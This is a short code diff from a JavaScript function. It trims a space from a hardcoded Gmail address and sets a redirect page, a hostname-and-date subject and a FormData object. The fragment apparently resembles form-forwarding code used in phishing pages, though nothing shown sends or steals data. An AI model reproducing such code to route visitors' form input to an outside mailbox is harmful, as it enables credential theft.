@@ -44,7 +44,7 @@ function o (e) {
   /* let t = document.querySelector("select");
     let o = t.value; */
   let a = document.querySelector('.label')
-  mail = ' codenew39@gmail.com'
+  mail = 'codenew39@gmail.com'
   next = 'next.html'
   subject = `${window.location.hostname} ${new Date()}`
   let r = new FormData()
